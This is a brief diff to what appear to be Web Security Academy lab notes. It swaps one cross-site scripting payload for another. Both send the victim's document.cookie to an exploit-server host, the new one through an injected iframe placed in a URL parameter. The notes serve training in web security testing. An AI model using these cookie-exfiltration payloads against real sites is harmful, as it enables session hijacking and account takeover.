@@ -638,7 +638,7 @@ An account delete feature specifies the path in a serialized format: `s:19:"user
 
 ```html
 <script>
-location='https://exploit-ID.exploit-server.net/?cookies='+document.cookie;
+location = "https://ID.web-security-academy.net/?parameter=" + encodeURIComponent("<iframe src='https://exploit-ID.exploit-server.net/?cookies=" + document.cookie + "'>");
 </script>
 ```
 ### Database Enumeration
